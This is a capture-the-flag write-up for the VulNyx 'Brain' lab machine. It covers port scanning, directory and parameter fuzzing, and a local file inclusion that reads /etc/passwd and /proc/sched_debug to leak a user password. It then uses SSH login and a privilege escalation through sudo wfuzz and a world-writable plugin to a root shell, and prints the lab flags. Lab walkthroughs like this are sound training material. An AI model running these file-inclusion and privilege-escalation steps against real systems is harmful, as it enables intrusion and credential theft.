# VulNyx - Brain

## Information

## Solution

### Enumeration
#### Nmap
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ nmap -sVC -p- -T4 10.11.5.19 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-19 20:34 +07
Nmap scan report for 10.11.5.19
Host is up (0.011s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 32:95:f9:20:44:d7:a1:d1:80:a8:d6:95:91:d5:1e:da (RSA)
|   256 07:e7:24:38:1d:64:f6:88:9a:71:23:79:b8:d8:e6:57 (ECDSA)
|_  256 58:a6:da:1e:0f:89:42:2b:ba:de:00:fc:71:78:3d:56 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.38 (Debian)
MAC Address: 08:00:27:83:03:E8 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.85 seconds
```

#### Web
![web](/walkthroughs/vulnyx/easy_difficulty/02_brain/web.png)

This is the content extracted from the system file `/proc/sched_debug` or the equivalent command on Linux.

#### Gobuster
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ gobuster dir -u http://10.11.5.19/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.11.5.19/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/server-status        (Status: 403) [Size: 275]
Progress: 220557 / 220557 (100.00%)
===============================================================
Finished
===============================================================
```
**Directory Brute Force**
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ gobuster dir -u http://10.11.5.19/ -w /usr/share/wordlists/dirb/common.txt -x bak,old,txt,zip
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.11.5.19/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              zip,bak,old,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess.txt        (Status: 403) [Size: 275]
/.htaccess.bak        (Status: 403) [Size: 275]
/.hta.bak             (Status: 403) [Size: 275]
/.hta.zip             (Status: 403) [Size: 275]
/.htaccess            (Status: 403) [Size: 275]
/.htaccess.old        (Status: 403) [Size: 275]
/.hta                 (Status: 403) [Size: 275]
/.htpasswd            (Status: 403) [Size: 275]
/.hta.old             (Status: 403) [Size: 275]
/.htaccess.zip        (Status: 403) [Size: 275]
/.htpasswd.old        (Status: 403) [Size: 275]
/.htpasswd.bak        (Status: 403) [Size: 275]
/.htpasswd.zip        (Status: 403) [Size: 275]
/.htpasswd.txt        (Status: 403) [Size: 275]
/.hta.txt             (Status: 403) [Size: 275]
/index.php            (Status: 200) [Size: 361]
/server-status        (Status: 403) [Size: 275]
Progress: 23065 / 23065 (100.00%)
===============================================================
Finished
===============================================================
```

### Shell
#### Wfuzz
**Parameter Brute Force**
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ wfuzz -c --hc=404 -w /usr/share/wordlists/wfuzz/general/common.txt -u "http://10.11.5.19/index.php?FUZZ=../../../../etc/passwd" --hh=361
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.11.5.19/index.php?FUZZ=../../../../etc/passwd
Total requests: 951

=====================================================================
ID           Response   Lines    Word       Chars       Payload             
=====================================================================

000000418:   200        33 L     64 W       1750 Ch     "include"           

Total time: 0
Processed Requests: 951
Filtered Requests: 950
Requests/sec.: 0
```
**Local File Inclusion (LFI)**
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ curl -sX GET "http://10.11.5.19/index.php?include=/etc/passwd" |grep "sh$"
root:x:0:0:root:/root:/bin/bash
ben:x:1000:1000:ben,,,:/home/ben:/bin/bash
```
We list the users `ben` and `root`.

```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ curl -sX GET "http://10.11.5.19/index.php?include=/proc/sched_debug" |grep ben
 S    ben:B3nP4zz   347      2967.559863        60   120         0.000000        18.442242         0.000000 0 0 /
```
We find `ben`'s credentials: `ben:B3nP4zz`.

#### SSH
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ ssh ben@10.11.5.19           
The authenticity of host '10.11.5.19 (10.11.5.19)' can't be established.
ED25519 key fingerprint is: SHA256:fkqq58u/sGpESMAWndC860Dp3sVGoKVkrQdlahLQV5A
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.11.5.19' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
ben@10.11.5.19's password: 
Linux brain 4.19.0-23-amd64 #1 SMP Debian 4.19.269-1 (2022-12-20) x86_64
ben@brain:~$ id; hostname
uid=1000(ben) gid=1000(ben) grupos=1000(ben)
brain
```

### Privilege Escalation
#### Enumeration
**Sudo**
```bash
ben@brain:~$ sudo -l
Matching Defaults entries for ben on Brain:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User ben may run the following commands on Brain:
    (root) NOPASSWD: /usr/bin/wfuzz
```
**Writable Files**
Find all files or folders across the system that our current user has write (writable) permissions for.
```bash
ben@brain:~$ find / -writable 2>/dev/null |grep -vE "proc|sys|tmp|run|dev|home|var"
/usr/lib/python3/dist-packages/wfuzz/plugins/payloads/range.py
ben@brain:~$ ls -l /usr/lib/python3/dist-packages/wfuzz/plugins/payloads/range.py
-rwxrwxrwx 1 root root 1519 abr 19  2023 /usr/lib/python3/dist-packages/wfuzz/plugins/payloads/range.py  
```
The file `/usr/lib/python3/dist-packages/wfuzz/plugins/payloads/range.py` is owned by the `root` user, but its permissions are `-rwxrwxrwx`. This means that anyone on the system, including user `ben`, has the permission to edit (write) the contents of this file.

#### Abuse
```bash
ben@brain:~$ sudo -u root /usr/bin/wfuzz -c -z range,1-10 -u http://localhost/

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

********************************************************
* Wfuzz 2.3.4 - The Web Fuzzer                         *
********************************************************

Target: http://localhost/
Total requests: 10

==================================================================
ID   Response   Lines      Word         Chars          Payload    
==================================================================


Fatal exception: FUZZ words and number of payloads do not match!

ben@brain:~$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1168776 abr 18  2019 /bin/bash
ben@brain:~$ /bin/bash -pi
bash-5.0# id ; hostname
uid=1000(ben) gid=1000(ben) euid=0(root) grupos=1000(ben)
brain
```

#### Flags
```bash
bash-5.0# find / -name root.txt -o -name user.txt 2>/dev/null |xargs cat
08c391c2d775390f54ee859d7395ac68
4be68799a5cef6a6e2b36379e8ae2759
```

***You are welcome***
